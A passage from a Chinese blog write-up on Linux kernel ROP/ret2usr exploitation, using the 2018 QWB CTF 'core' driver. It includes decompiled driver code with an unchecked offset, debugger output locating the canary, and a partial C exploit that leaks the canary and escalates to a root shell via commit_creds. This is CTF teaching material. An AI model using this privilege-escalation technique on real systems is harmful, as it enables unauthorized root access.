pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi             /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi             /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx             /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu    /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS        /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8              /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9              /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10             /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure><p>· 通过汇编指令判断是否为x32_abi<br>· 通过系统调用号，跳到全局变量sys_call_table相应位置继续执行系统调用</p><h5 id="kernel-spces-to-user-space"><a href="#kernel-spces-to-user-space" class="headerlink" title="kernel spces to user space"></a>kernel spces to user space</h5><p>· 通过<code>swapgs</code>恢复之前保存GS值<br>· 通过<code>sysretq</code>或者<code>iretq</code>恢复用户控件继续执行。如果使用<code>iretq</code>还需要给出用户空间的一些信息(CS,eflags/rflags,esp/rsp等)</p><h4 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h4><p>这个结构体记录进程的权限，如果能读写这个结构体，就可以修改进程的权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we're permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a>内核态函数</h4><p>kernel 有个两个函数可以改变进程的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int commit_creds(struct cred *new)</span><br><span class="line">struct cred* prepare_kernel_cred(struct task_struct* daemon)</span><br><span class="line">执行commit_creds(prepare_kernel_cred(0))就可以获得uid，gid=0的权限</span><br><span class="line">可以在/proc/kallsyms中查看</span><br><span class="line">也可以利用thread_info中cred和read_cred 修改cred</span><br></pre></td></tr></table></figure><h4 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h4><h4 id="mep"><a href="#mep" class="headerlink" title="mep"></a>mep</h4><p>Supervisor Mode Execution Protection，当处理器处于 ring0 模式时，执行 用户空间 的代码会触发页错误。（在 arm 中该保护称为 PXN)</p><h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p> Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时</p><h3 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h3><p>linux kernel  rop 和 user spces 的rop 其实大同小异，只是多了几个步骤。<br>而linux kernel  re2usr 则是 从kernel 返回到用户控制执行user spces的代码<br>一般导致这两个漏洞产生的原因都是越界访问后面的内存，就是溢出<br>拿2018年强网杯的 core 来做分析</p><h4 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h4><p>有四个文件<br><code>bzImage core.cpio start.sh vmlinux</code><br>先看看 start.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure><p>发现开了 kaslr<br>再解压 core.cpio 看看init</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sh end!\n'</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>发现把 kallsyms保存到tmp，虽然不可以读/proc/kallsyms 但是可以读tmp目录下的<br>挂载了 core.ko<br>那么就来分析 下core.ko 这题的突破口应该就是这个驱动程序<br>这个程序注册了7个函数，并且开了 Canary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">core_release core_write core_read core_copy_func</span><br><span class="line">core_ioctl init_moddule exit_core</span><br><span class="line">└─[2] &lt;&gt; checksec core.ko </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><h5 id="core-ioctl"><a href="#core-ioctl" class="headerlink" title="core_ioctl"></a>core_ioctl</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3); <span class="comment">//读</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = v3; <span class="comment">// 设置 off</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(v3);写</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="core-read"><a href="#core-read" class="headerlink" title="core_read"></a>core_read</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">core_read</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16L</span>L; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="keyword">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v5, <span class="string">"Welcome to the QWB CTF challenge.\n"</span>);</span><br><span class="line">  result = copy_to_user(v1, (<span class="keyword">char</span> *)&amp;v5 + off, <span class="number">64L</span>L); <span class="comment">//这里的off并没有约束，而且可控</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><h5 id="core-write"><a href="#core-write" class="headerlink" title="core_write"></a>core_write</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, v3) )<span class="comment">//a2 v3 没有约束，而且可控</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析到这里我们们就可以大概想到如何提取<br>既然开了canary 而且读的时候 offset可以控，那么首先控制offset指向canary，然后读出来，再写rop<br>那么写个测试程序来测试下canary的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffffc03190ba &lt;core_read+87&gt;     mov    rsi, rsp -&gt;v5</span><br><span class="line"> ► 0xffffffffc03190bd &lt;core_read+90&gt;     add    rsi, qword ptr [rip + 0x2b3c]//offset</span><br><span class="line">   0xffffffffc03190c4 &lt;core_read+97&gt;     mov    edx, 0x40</span><br><span class="line">   0xffffffffc03190c9 &lt;core_read+102&gt;    mov    rdi, rbx</span><br><span class="line">   0xffffffffc03190cc &lt;core_read+105&gt;    call   0xffffffffa9926f10</span><br><span class="line">00:0000│ rax rdi rsi rsp  0xffffb526c00d3e18 ◂— &apos;Welcome to the QWB CTF challenge.\n&apos;</span><br><span class="line">01:0008│                  0xffffb526c00d3e20 ◂— &apos;to the QWB CTF challenge.\n&apos;</span><br><span class="line">02:0010│                  0xffffb526c00d3e28 ◂— &apos;WB CTF challenge.\n&apos;</span><br><span class="line">03:0018│                  0xffffb526c00d3e30 ◂— &apos;hallenge.\n&apos;</span><br><span class="line">04:0020│ rdx-3            0xffffb526c00d3e38 ◂— 0xa2e /* &apos;.\n&apos; */</span><br><span class="line">05:0028│                  0xffffb526c00d3e40 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">08:0040│                  0xffffb526c00d3e58 ◂— 0xb96743b5aa598100  //canary</span><br><span class="line">偏移就是0x40,</span><br><span class="line">测出偏移就可以读出canary</span><br></pre></td></tr></table></figure><p>ROP exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_READ  0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_SET   0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_WRITE 0x6677889A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags,user_sp;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">    <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">    <span class="string">"movq %%rsp, %2\n"</span></span><br><span class="line">    <span class="string">"pushfq\n"</span></span><br><span class="line">    <span class="string">"popq %3\n"</span></span><br><span class="line">    : <span class="string">"=r"</span> (user_cs), <span class="string">"=r"</span> (user_ss),<span class="string">"=r"</span>(user_sp),<span class="string">"=r"</span> (user_rflags) : : <span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_uid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> find_symbols()&#123;</span><br><span class="line">    FILE * fd = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"commit_creds addr: %p\n"</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"vmlinux_base addr: %p\n"</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"prepare_kernel_cred addr: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]Error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_state();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open /proc/core error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,CORE_SET, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd,CORE_READ, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = 